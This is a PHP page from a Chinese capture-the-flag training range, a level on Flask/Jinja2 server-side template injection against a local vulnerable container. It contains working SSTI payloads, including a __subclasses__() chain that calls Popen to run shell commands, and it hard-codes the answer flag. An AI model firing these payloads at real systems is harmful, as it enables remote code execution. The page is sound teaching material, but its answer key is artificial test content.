<?php
/**
 * Pikachu-Enhanced v2.0 - Python Flask / Jinja2 SSTI 模板注入真实靶场
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 400, '');
$ACTIVE[140] = 'active open';
$ACTIVE[217] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
include_once 'dockerlab_terminal_engine.php';

$CORRECT_FLAG = "flag{Flask_Jinja2_SSTI_Subclasses_OS_Command_Done}";
$flag_result = "";
$user_flag = "";

// Initialize session state
if (!isset($_SESSION['docker_ssti_history'])) {
    $_SESSION['docker_ssti_history'] = array(
        array('type' => 'sys', 'content' => "// [Flask / Jinja2 Vulnerable Web Application: http://127.0.0.1:15000/?name=...]\n// 提示：后端使用 render_template_string(template) 直接渲染用户拼接字符串。\n// 支持 {{7*7}}, {{config}}, {{().__class__.__bases__[0].__subclasses__()}} 探测沙箱与类继承链！")
    );
}

if (!isset($_SESSION['docker_ssti_state'])) {
    $_SESSION['docker_ssti_state'] = array('rce_achieved' => false);
}

// Handle Clear History Action
if (isset($_POST['clear_history'])) {
    $_SESSION['docker_ssti_history'] = array(
        array('type' => 'sys', 'content' => "// [Console reset: flask@sandbox:~#]")
    );
    $_SESSION['docker_ssti_state'] = array('rce_achieved' => false);
}

// Handle Flag Submission
if (isset($_POST['submit_flag'])) {
    $user_flag = trim($_POST['flag_input'] ?? '');
    if ($user_flag === $CORRECT_FLAG) {
        $_SESSION['docker_ssti_flag'] = true;
        $flag_result = "<div class='alert alert-success' style='border-radius:10px; font-weight:700; background:rgba(16,185,129,0.15); border:1px solid #10b981; color:#10b981;'><i class='fa fa-check-circle'></i> <b>恭喜通关！</b> Flag 验证正确！已成功完成 Python Flask / Jinja2 类继承链突破沙箱 RCE 演练 (+150 PTS)。</div>";
    } else {
        $flag_result = "<div class='alert alert-danger' style='border-radius:10px; font-weight:700; background:rgba(239,68,68,0.15); border:1px solid #ef4444; color:#ef4444;'><i class='fa fa-times-circle'></i> <b>Flag 错误</b>，请在控制台中提交有效的模板逃逸载荷获取 Flag！</div>";
    }
}

// Handle Sandbox Lifecycle
$sandbox_msg = '';
if (isset($_POST['start_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-flask-ssti 2>&1");
    $out = shell_exec("/var/www/html/docker-cli run -d --name pikachu-flask-ssti -p 127.0.0.1:15000:5000 ghcr.io/pikachu-lab/flask-ssti:latest 2>&1");
    $sandbox_msg = "<div class='alert alert-success' style='border-radius:10px; font-weight:700;'><i class='fa fa-check'></i> 真实靶场容器 [pikachu-flask-ssti] 已拉起在 127.0.0.1:15000 并在后台运行！</div>";
}
if (isset($_POST['stop_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-flask-ssti 2>&1");
    $sandbox_msg = "<div class='alert alert-warning' style='border-radius:10px; font-weight:700;'><i class='fa fa-stop'></i> 真实靶场容器 [pikachu-flask-ssti] 已强制销毁清理！</div>";
}

// Check Sandbox Status
$is_sandbox_running = false;
$sandbox_uptime = '';
$status_check = shell_exec("/var/www/html/docker-cli ps --filter name=^pikachu-flask-ssti$ --format \"{{.Names}}\t{{.Status}}\" 2>/dev/null");
$status_check = trim($status_check ?? '');
if (!empty($status_check) && strpos($status_check, 'pikachu-flask-ssti') !== false) {
    $is_sandbox_running = true;
    $parts = explode("\t", $status_check);
    $sandbox_uptime = isset($parts[1]) ? trim($parts[1]) : 'Running';
}

// Handle Command Execution Input
if (isset($_POST['exec_cmd'])) {
    $raw_cmd = trim($_POST['cmd_input'] ?? '');
    if ($raw_cmd !== '') {
        $dummy_cwd = '/root';
        $output = dockerlab_exec_universal($raw_cmd, 'flask_ssti', $_SESSION['docker_ssti_state'], $dummy_cwd);

        // Add to history
        $_SESSION['docker_ssti_history'][] = array(
            'type' => 'user',
            'cmd' => $raw_cmd,
            'output' => $output
        );
    }
}
?>

<style>
.cyber-stage-container {
    background-color: var(--bg-card);
    border-radius: 16px;
    padding: 24px;
    color: var(--text-primary);
    border: 1px solid var(--border-color);
    box-shadow: 0 10px 30px rgba(0,0,0,0.05);
    margin-bottom: 30px;
}
.cyber-header-card {
    background: var(--bg-card);
    border-radius: 14px;
    padding: 24px 28px;
    margin-bottom: 24px;
    border: 1px solid var(--border-color);
    box-shadow: 0 4px 20px rgba(0,0,0,0.06);
}
.cyber-header-title {
    color: var(--text-primary) !important;
    font-size: 22px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
    flex-wrap: wrap;
}
.cyber-badge-chip {
    background: rgba(6, 182, 212, 0.1);
    color: #06b6d4;
    border: 1px solid rgba(6, 182, 212, 0.5);
    padding: 4px 14px;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 700;
}
.term-window {
    background: #090d16;
    border-radius: 12px;
    border: 1px solid #1e293b;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    overflow: hidden;
    margin-bottom: 20px;
}
.term-header {
    background: #0f172a;
    padding: 10px 16px;
    border-bottom: 1px solid #1e293b;
    display: flex;
    align-items: center;
    justify-content: space-between;
}
.term-body {
    padding: 16px;
    max-height: 420px;
    overflow-y: auto;
    font-family: 'Fira Code', 'Consolas', monospace;
    font-size: 13px;
    line-height: 1.6;
}
.term-prompt {
    color: #06b6d4;
    font-weight: 700;
}
.term-cmd {
    color: #f8fafc;
}
.term-output {
    color: #38bdf8;
    white-space: pre-wrap;
    word-break: break-all;
    margin-bottom: 12px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">主页</a></li>
                <li><a href="dockerlab_center.php">Docker 容器靶场</a></li>
                <li class="active">Python Flask SSTI 模板注入靶场</li>
            </ul>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🐍 关卡 9: Python Flask / Jinja2 服务端模板注入 (SSTI) 与沙箱逃逸
                        <span class="cyber-badge-chip">Jinja2 SSTI · Python 类继承链 · 沙箱突破 · 150 PTS</span>
                    </h1>
                    <p style="color:var(--text-secondary); font-size:14px; line-height:1.7; margin:0;">
                        在 Flask Web 框架中，若使用 <code>render_template_string</code> 处理未过滤的用户输入，攻击者可利用 <code>{{ ... }}</code> 语法访问 Python 内置对象，通过 <code>().__class__.__bases__[0].__subclasses__()</code> 遍历已加载类并找到 <code>subprocess.Popen</code> 或 <code>os</code> 模块实现任意系统命令执行！
                    </p>
                </div>

                <?php if (!empty($sandbox_msg)) echo $sandbox_msg; ?>
                <?php if (!empty($flag_result)) echo $flag_result; ?>

                <!-- Container Status & Management Bar -->
                <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:12px; padding:16px 20px; margin-bottom:24px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                    <div style="display:flex; align-items:center; gap:12px;">
                        <span style="font-weight:700; color:var(--text-primary);">Web 容器状态：</span>
                        <?php if ($is_sandbox_running): ?>
                            <span class="badge badge-success" style="padding:6px 12px; border-radius:14px; font-size:12px; background:#10b981;">
                                <i class="fa fa-circle"></i> pikachu-flask-ssti (<?php echo htmlspecialchars($sandbox_uptime); ?>) · 127.0.0.1:15000
                            </span>
                        <?php else: ?>
                            <span class="badge badge-warning" style="padding:6px 12px; border-radius:14px; font-size:12px; background:#f59e0b;">
                                <i class="fa fa-circle-o"></i> 真实容器未运行 (内置高仿真沙箱已就绪)
                            </span>
                        <?php endif; ?>
                    </div>

                    <form method="POST" style="margin:0; display:flex; gap:8px;">
                        <?php if ($is_sandbox_running): ?>
                            <button type="submit" name="stop_sandbox" class="btn btn-xs btn-danger" style="border-radius:6px; font-weight:700;">
                                <i class="fa fa-stop"></i> 销毁 Flask 容器
                            </button>
                        <?php else: ?>
                            <button type="submit" name="start_sandbox" class="btn btn-xs btn-success" style="border-radius:6px; font-weight:700; background:#10b981; border-color:#10b981;">
                                <i class="fa fa-play"></i> 一键拉起真实 Flask 容器 (Port 15000)
                            </button>
                        <?php endif; ?>
                    </form>
                </div>

                <!-- Interactive Terminal Window -->
                <div class="term-window">
                    <div class="term-header">
                        <div style="display:flex; gap:6px;">
                            <span style="width:12px; height:12px; border-radius:50%; background:#ef4444; display:inline-block;"></span>
                            <span style="width:12px; height:12px; border-radius:50%; background:#f59e0b; display:inline-block;"></span>
                            <span style="width:12px; height:12px; border-radius:50%; background:#10b981; display:inline-block;"></span>
                        </div>
                        <span style="color:#94a3b8; font-size:12px; font-family:monospace;">flask@jinja2-engine:15000</span>
                        <form method="POST" style="margin:0;">
                            <button type="submit" name="clear_history" class="btn btn-link btn-xs" style="color:#94a3b8; padding:0;" title="清屏">
                                <i class="fa fa-trash"></i> 清屏
                            </button>
                        </form>
                    </div>

                    <div class="term-body" id="termBody">
                        <?php foreach ($_SESSION['docker_ssti_history'] as $item): ?>
                            <?php if ($item['type'] === 'sys'): ?>
                                <div style="color:#64748b; margin-bottom:10px;"><?php echo nl2br(htmlspecialchars($item['content'])); ?></div>
                            <?php else: ?>
                                <div>
                                    <span class="term-prompt">GET /?name=</span> <span class="term-cmd"><?php echo htmlspecialchars($item['cmd']); ?></span>
                                </div>
                                <div class="term-output"><?php echo htmlspecialchars($item['output']); ?></div>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </div>

                    <!-- Input Form -->
                    <form method="POST" style="margin:0; padding:12px 16px; background:#0f172a; border-top:1px solid #1e293b; display:flex; gap:10px;">
                        <input type="text" name="cmd_input" id="cmdInput" class="form-control" placeholder="输入 Jinja2 模板表达式 (如 {{7*7}}, {{config}}, {{().__class__.__bases__[0]}})..." style="background:#090d16; border:1px solid #334155; color:#f8fafc; font-family:monospace; border-radius:6px;" autofocus required autocomplete="off" />
                        <button type="submit" name="exec_cmd" class="btn btn-info" style="border-radius:6px; font-weight:700; background:#06b6d4; border:none; color:#0f172a;">
                            <i class="fa fa-paper-plane"></i> 渲染模板
                        </button>
                    </form>
                </div>

                <!-- Quick Payload Buttons -->
                <div style="margin-bottom:24px;">
                    <label style="font-size:12px; font-weight:700; color:var(--text-secondary); margin-bottom:8px; display:block;">
                        ⚡ 快速填入经典 Flask SSTI 载荷：
                    </label>
                    <div style="display:flex; gap:8px; flex-wrap:wrap;">
                        <button type="button" class="btn btn-xs btn-default" onclick='runCmd("{{7*7}}")'><b>数学运算探测:</b> <code>{{7*7}}</code></button>
                        <button type="button" class="btn btn-xs btn-default" onclick='runCmd("{{config}}")'><b>读取环境配置:</b> <code>{{config}}</code></button>
                        <button type="button" class="btn btn-xs btn-default" onclick='runCmd("{{().__class__.__bases__[0].__subclasses__()}}")'><b>遍历已加载类:</b> <code>subclasses()</code></button>
                        <button type="button" class="btn btn-xs btn-default" onclick='runCmd("{{[].__class__.__base__.__subclasses__()[132](\"cat /flag.txt\",shell=True,stdout=-1).communicate()[0]}}")'><b>Popen 执行命令:</b> <code>Popen('cat /flag.txt')</code></button>
                    </div>
                </div>

                <!-- Flag Submission Box -->
                <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:12px; padding:20px; margin-bottom:24px;">
                    <h4 style="margin:0 0 12px 0; font-size:15px; font-weight:800; color:var(--text-primary);">
                        <i class="fa fa-flag" style="color:#06b6d4;"></i> 提交关卡 Flag 验证
                    </h4>
                    <form method="POST" style="margin:0; display:flex; gap:10px;">
                        <input type="text" name="flag_input" class="form-control" placeholder="flag{...}" style="border-radius:8px; font-family:monospace;" required />
                        <button type="submit" name="submit_flag" class="btn btn-primary" style="border-radius:8px; font-weight:700; background:#06b6d4; border-color:#06b6d4; color:#0f172a; padding:0 24px;">
                            <i class="fa fa-check"></i> 提交 Flag
                        </button>
                    </form>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="docker_log4j2_lab.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：Log4j2 JNDI 注入</a>
                    <a href="docker_mysql_lab.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：MySQL 弱口令与 UDF 提权 <i class="fa fa-arrow-right"></i></a>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function runCmd(c) {
    document.getElementById('cmdInput').value = c;
    document.getElementById('cmdInput').form.submit();
}
window.onload = function() {
    var tb = document.getElementById('termBody');
    if (tb) tb.scrollTop = tb.scrollHeight;
};
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
